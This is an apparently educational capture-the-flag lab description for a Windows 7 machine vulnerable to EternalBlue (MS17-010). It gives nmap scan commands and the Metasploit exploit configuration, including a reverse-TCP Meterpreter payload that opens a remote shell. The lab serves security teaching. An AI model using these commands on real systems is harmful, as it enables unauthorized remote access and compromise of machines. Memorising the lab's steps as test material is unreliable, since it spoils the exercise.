# ETERNAL BLUE Lab

This lab tests the student's ability to identify vulnerable services on Windows systems and exploit the **EternalBlue (MS17-010)** vulnerability using Metasploit. Through this challenge, students will learn:

- How to detect exposed SMB services on the network.
- Using `nmap` for vulnerability scanning with NSE scripts.
- Exploiting EternalBlue using the Metasploit module.
- Gaining remote access via a `Meterpreter` session.
- Reading flags on a Windows user's desktop.

## Machine Specifications 🖥️

- **System:** Windows 7
- **Hostname:** ETERNAL-BLUE
- **Active Services:**
    - 445 (SMB)

- **Desktop Background:** Custom image of a regular user
- **Username:** `user1` (can be customized)
- **Flag:** `C:\Users\user1\Desktop\flag.txt`

## Steps Expected from the Student

1. Discover the machine's IP address. Recommended tools: `nmap`, `netdiscover`, or `arp-scan`.

2. Scan port 445 and detect the MS17-010 vulnerability. Suggested command:

        ```bash
        nmap -p 445 --script smb-vuln-ms17-010 <IP>
        ```

3. Load and configure the exploit in Metasploit. Module to use:

        ```bash
        use exploit/windows/smb/ms17_010_eternalblue
        ```

        Typical parameters:

                ```bash
                set RHOSTS <IP>
                set LHOST <local_IP>
                set PAYLOAD windows/x64/meterpreter/reverse_tcp
                run
                ```

4. Obtain a Meterpreter session. Validate access with:

        ```bash
        getuid
        ```

5. Navigate to the user's desktop and read the flag.
